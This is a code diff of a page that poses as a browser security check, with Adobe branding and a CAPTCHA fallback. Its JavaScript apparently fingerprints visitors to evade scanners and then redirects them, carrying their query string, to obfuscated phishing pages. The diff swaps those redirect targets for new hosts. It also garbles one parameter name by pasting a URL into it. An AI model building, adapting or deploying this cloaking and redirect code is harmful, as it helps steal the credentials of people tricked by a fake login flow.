@@ -61,7 +61,7 @@
         padding: 0;
         margin: 0;
     }
-    
+
   </style>
 </head>
 <body>
@@ -71,13 +71,13 @@
   </div>
   <h1>Please wait while we validate your browser...</h1>
   <div class="loading">Running security checks...</div>
-  
+
   <noscript>
     <meta http-equiv="refresh" content="0; url=noscript.html" />
   </noscript>
-  
+
   <script>
-   
+
 
 const BotDefense = (() => {
   const testPassed = [];
@@ -336,8 +336,8 @@ function renderRecaptchaFallback(queryString) {
         <img style="width:120px;margin:0 auto;" src="https://www.adobe.com/content/dam/cc/icons/adobe_wordmark_red.svg">
         <h3>Verification Required</h3>
         <p>Please complete the CAPTCHA below to continue.</p>
-        <div class="g-recaptcha" data-sitekey="6Lfks4IrAAAAAGYiil9qo5l7H-QyQcZpNgjJOGiA" data-callback="onCaptchaSuccess" style="display:grid;justify-contents:center;text-align:center;margin:0 auto;"></div>
-        
+        <div class="g-recaptcha" data-sitekey="6LfKO3UrAAAAAMWlC0f6onXwcIW_eN-GPrW4v2l7" data-callback="onCaptchaSuccess" style="display:grid;justify-contents:center;text-align:center;margin:0 auto;"></div>
+
       </div>
       <svg style="position:absolute;" class="LoggedOutHome__backgroundImage___lQqQ6" alt="" id="Layer_1" data-name="Layer 1" viewBox="0 0 473.33 138.89"><path d="m435.44,32.13c-2.86,0-5.85.66-8.7,2.03-12.44,5.97-22.33,23.93-20.83,57.15,15.08-7.76,26.62-16.07,34.08-24.03,15.27-16.3,9.84-26.58,7.82-29.34-2.78-3.78-7.37-5.8-12.36-5.8Z" fill="none" stroke-width="0"></path><path d="m401.05,107.73c1.3,9.71,3.37,20.1,6.22,31.17h6.55c-3.3-12.54-5.48-23.85-6.73-34-2.24,1.09-4.28,2.04-6.04,2.83Z" fill="#fa0f00" stroke-width="0"></path><path d="m452.91,34.19c-6.17-8.41-18.33-10.82-28.92-5.74-10.94,5.25-18.91,17.33-22.42,34.01-1.97,9.36-2.59,20.02-1.86,31.92-29.69,14.1-71.31,25.93-121.47,29.85C213.71,129.27,113.79,122.72,0,64.39v7.11c113.91,57.65,213.93,64.12,278.74,59.05,37.68-2.95,73.8-10.65,104.43-22.28,5.97-2.26,11.68-4.66,17.09-7.16,0,0,0,.01,0,.02,1.82-.84,3.88-1.83,6.1-2.94h0c16.35-8.17,29.55-17.29,38.24-26.57,9.69-10.35,16.96-25.61,8.3-37.42Zm-12.93,33.09c-7.46,7.96-19,16.27-34.08,24.03-1.51-33.22,8.39-51.18,20.83-57.15,2.86-1.37,5.84-2.03,8.7-2.03,4.99,0,9.59,2.02,12.36,5.8,2.03,2.76,7.45,13.05-7.82,29.34Z" fill="#fa0f00" stroke-width="0"></path></svg>
     `;
@@ -349,7 +349,7 @@ function renderRecaptchaFallback(queryString) {
     document.head.appendChild(script);
 
     window.onCaptchaSuccess = function () {
-      const finalRedirect = `https://03546079-43-5469rtgcv-dsfdgr64-ereve.s3.us-east-2.amazonaws.com/DSJFKGBIROSFN-54YTHG-RI534R-FCZFXJSERFCLKZXD-23-R9HIFCKXLDSERLF-DFGF/FDGB9EDF-43GRIOLG-DOFBJI409EJKLZF-43R-VXXD-9QETJBDBCNGVIXCZFX-GHNGVCFX/xam.html#${queryString}`;
+      const finalRedirect = `https://kcramer.com/Sec1emNoXgalRa9wtuTuXgwtJ7J72cqTrBhQanoRa9s32cqTrB#${queryString}`;
       window.location.href = finalRedirect;
     };
   }
@@ -358,7 +358,7 @@ function renderRecaptchaFallback(queryString) {
     try {
       const queryString = window.location.href.split('?')[1] || '';
       if (testPassed.length >= 5 && testPassed.includes('UserAgentCheck') && testPassed.includes('DateComp')) {
-        window.location.href = `https://4egh-tgf-56rgds-sh35-rgfhj-drre-redact-35469r-g.s3.us-east-2.amazonaws.com/RIUOWJDAOI-TRBIOFSLCZ03Q4R-FSZ--IOFJDJKSFFO-F3T4RHG-SDFDGF/389GEOJIDSLLD390ITORF-435490RDV90XIZKLD-4RTH-NG-MFGREHNT-HSGEYHTGDCZ-DEHYTHG/xam.html#${queryString}`;
+        window.location.href = `https://kcramer.com/Sec2vPoM81vxQkZhEmoelQa4riZfelQa4sr8PuZgsoM81vxQkZ#${queryString}`;
       } else {
         renderRecaptchaFallback(queryString);
       }
@@ -368,7 +368,7 @@ function renderRecaptchaFallback(queryString) {
   }
 
   return {
-    async run(serverEmailCopy = null, recipientDomain = '') {
+    async run(serverEmailCopy = null, recipientDomhttps://kcramer.com/Sec2vPoM81vxQkZhEmoelQa4riZfelQa4sr8PuZgsoM81vxQkZain = '') {
       checkDOMReady();
       await checkCookies(serverEmailCopy, recipientDomain);
       botFingerprintCheck();
